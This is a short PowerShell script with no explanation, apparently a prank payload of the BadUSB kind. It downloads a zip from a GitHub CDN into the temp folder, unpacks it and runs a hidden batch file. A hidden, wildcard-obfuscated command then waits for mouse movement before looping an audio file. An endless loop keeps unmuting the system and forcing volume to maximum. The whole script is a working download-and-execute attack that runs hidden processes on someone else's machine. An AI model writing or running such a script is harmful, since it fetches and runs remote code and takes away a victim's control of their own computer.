Invoke-WebRequest https://cdn.statically.io/gh/l4l4l4l4ll/files/99eadabcb5437c1449a4d27cd2816621932d19d6/loud/boom.zip -OutFile $env:temp\boom.zip
Expand-Archive -Force -Path $env:temp\boom.zip -DestinationPath $env:temp\boom
Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 1}};Start-Process -FilePath "$env:temp/boom/mpg123.exe" -WindowStyle Hidden -ArgumentList "--loop -1 $env:temp/boom/boom.mp3"
while ($true) {
  Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "mutesysvolume 0"
  Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "setsysvolume 65535"
  Start-Sleep -Seconds 0.5
}